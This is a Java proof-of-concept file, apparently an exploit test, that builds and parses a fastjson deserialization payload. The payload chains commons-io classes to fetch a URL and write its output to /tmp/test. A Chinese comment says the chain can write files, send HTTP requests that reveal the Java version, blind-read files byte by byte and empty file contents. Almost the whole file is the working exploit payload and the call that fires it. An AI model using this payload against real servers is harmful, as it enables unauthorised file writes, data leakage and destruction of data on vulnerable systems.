package com.example.servletdemo.fastjsontest;

import com.alibaba.fastjson.JSON;
import org.apache.commons.io.ByteOrderMark;
/**
 * @author : Walker
 * @date : Created in 2022/5/11 2:16 PM
 * @description: fastjson commons-io库 写文件、http请求(http请求头可返回java版本)、盲读文件（字节比对，相当于布尔盲注）、清空文件内容
 */
public class test {
    public static void main(String[] args) {
        String json = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\":{\n" +
                "      \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": {\"@type\": \"org.apache.commons.io.input.TeeReader\",\n" +
                "        \"input\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"http://127.0.0.1:8083/123123\"\n" +
                "        },\n" +
                "        \"branch\": {\"@type\":\"org.apache.commons.io.output.XmlStreamWriter\",\n" +
                "          \"file\":\"/tmp/test\",\n" +
                "          \"defaultEncoding\":\"UTF-8\"\n" +
                "        },\n" +
                "        \"closeBranch\":false\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 20000\n" +
                "    },\n" +
                "    \"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [97]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
        System.out.println(json);
        JSON.parse(json);
    }
}
